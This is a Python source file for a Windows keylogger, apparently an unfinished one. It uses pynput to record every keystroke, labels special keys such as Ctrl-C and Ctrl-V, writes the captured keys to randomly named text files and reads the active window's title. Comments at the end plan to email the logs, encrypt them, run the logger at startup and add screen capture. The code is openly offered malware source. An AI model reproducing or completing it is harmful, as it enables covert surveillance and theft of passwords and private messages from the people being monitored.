from pynput.keyboard import Listener
import win32gui
import listener
import random
import os
from datetime import date

data = []

def on_press(key):

    subs = ['Key.enter', ' [ENTER] ', 'Key.backspace', ' [BACKSPACE] ', 'Key.space', ' ',
            'Key.alt_l', ' [ALT] ', 'Key.tab', ' [TAB] ', 'Key.delete', ' [DEL] ', 'Key.ctrl_l', ' [CTRL] ',
            'Key.left', ' [LEFT ARROW] ', 'Key.right', ' [RIGHT ARROW] ', 'Key.shift', ' [SHIFT] ', '\\x13',
            ' [CTRL-S] ', '\\x17', ' [CTRL-W] ', 'Key.caps_lock', ' [CAPS LK] ', '\\x01', ' [CTRL-A] ', 'Key.cmd',
            ' [WINDOWS KEY] ', 'Key.print_screen', ' [PRNT SCR] ', '\\x03', ' [CTRL-C] ', '\\x16', ' [CTRL-V] ']

    k = "{0}".format(key)

    if k in subs:
        data.append(subs[subs.index(k)+1])
    else:
        data.append(k)


def writeLogs(chars):
    path = os.path.expandvars("temp")
    fileName = str(chars) + 'I' + str(random.randint(1000000, 9999999)) + '.txt'
    with open(fileName, "w") as f:
        f.write(''.join(data))
        dateToday = date.today()  # date of everytime keylogger is open
        f.write(str(data) + "\n")
        f.close()


def appListener():
    appOpen = win32gui.GetWindowText(win32gui.GetForegroundWindow())
    if appOpen == "Cortana":
        appOpen = "Windows Start Menu"
    else:
        pass


# add a function to send the logs via email
# add a function to encrypt and decrypt logs
# startup keylogger
# screen logger
# possibly adding a window filter 